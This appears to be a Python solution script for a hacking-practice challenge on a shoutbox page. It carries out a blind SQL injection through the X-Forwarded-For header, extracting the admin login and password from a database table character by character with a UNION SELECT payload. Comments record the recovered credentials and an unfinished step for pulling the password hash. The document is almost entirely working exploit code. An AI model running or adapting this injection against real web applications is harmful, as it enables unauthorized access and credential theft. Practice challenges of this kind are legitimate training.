# -*- coding:utf-8 -*-
import sys
import time
import requests

url = "http://hacking.newbiecontest.org:10080/shoutbox/poster.php"
#url = "http://localhost/shootbox/poster.php"

# step 1: post useless message to start flood control
#params={'message': 'testoche', 'pseudo': 'kartofel'}
#r =requests.get(url, headers={'X-FORWARDED-FOR': '8.8.8.8'}, params=params)

#if "avec succ" not in r.text:
#    print r.text
#    sys.exit("error in step1")
    
# step 2: blind SQLI to get admin username
params={'message': 'ink ink ink ink ink', 'pseudo':'zorglub'}

#inj = "42' UNION SELECT login,password,rank FROM shootbox_admin WHERE SUBSTRING(login,1,{0})='{1}' -- -"
inj = "42' UNION SELECT login,password,rank FROM shootbox_admin WHERE password LIKE '{0}%' -- -"
#login = Dieu
#pwd = unsecure
alpha = 'abcdefghijklmnopqrstuvwxyz'
alpha += '0123456789'
goodlogin = 'e4'

done = False
while not done:
    done = True
    for lettre in alpha:
        time.sleep(1)
        r = requests.get(url, params=params, headers={'X-Forwarded-For': inj.format(goodlogin+lettre)})

        if "Erreur SQL" not in r.text:
            goodlogin += lettre
            print(r.text)
            done = False
            print("hit! login = " + goodlogin)
            break

print("Done; login = " + goodlogin)

# step 3: blind SQLI to get admin password md5


